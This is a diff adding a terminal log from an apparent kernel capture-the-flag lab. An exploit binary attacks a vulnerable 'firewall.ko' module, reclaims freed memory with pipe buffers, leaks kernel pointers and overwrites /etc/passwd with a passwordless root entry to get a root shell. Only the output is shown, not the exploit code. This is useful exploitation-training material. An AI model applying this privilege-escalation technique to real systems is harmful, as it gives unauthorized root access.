@@ -1,0 +1,59 @@
+c[?7l[2J[0mSeaBIOS (version Arch Linux 1.17.0-2-2)
+
+
+iPXE (http://ipxe.org) 00:03.0 C900 PCI2.10 PnP PMM+0EFD3E10+0EF33E10 C900
+Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               
+
+
+Booting from ROM..c[?7l[2J[*] Loading firewall module...
+[+] Module loaded successfully
+=====================================
+  Kernel CTF Environment
+=====================================
+Module:  /home/ctf/firewall.ko
+Exploit: /home/ctf/exploit
+Flag:    /flag.txt (root only)
+
+You are: ctf (uid=1000)
+Goal: Exploit the firewall module!
+=====================================
+
+
+BusyBox v1.30.1 (Ubuntu 1:1.30.1-7ubuntu3.1) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+sh: can't access tty; job control turned off
+~ $ [6n.[Jid
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+~ $ [6n./ex~ $ ./exploit[J
+[+] fd = 3
+[+] fd @ /dev/firewall abierto correctamente
+
+[+] Asignando pipe buffers to reclaim the memory
+
+[*] rule index 0
+[+] Regla enviada correctamente!
+
+[+] Regla deleteada correctamente!
+
+[+] pipe_buffer creado
+[+] Inspeccionando el objeto reclamado...
+[+] Datos devueltos por FW_SHOW_RULE:
+[+] page  = 0xffffea000009fa40
+[+] offset = 0
+[+] len    = 1
+[+] ops    = 0xffffffff8221c160
+[+] flags  = 0x0
+[*] Overwriting /etc/passwd with root::0:0::/root:/bin/sh
+
+Intento de shell
+su: /etc/passwd: bad record
+
+
+BusyBox v1.30.1 (Ubuntu 1:1.30.1-7ubuntu3.1) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+/bin/sh: can't access tty; job control turned off
+/home/ctf # [6ncat /flag.txt
+bctf{fake_flag}
+/home/ctf # [6n
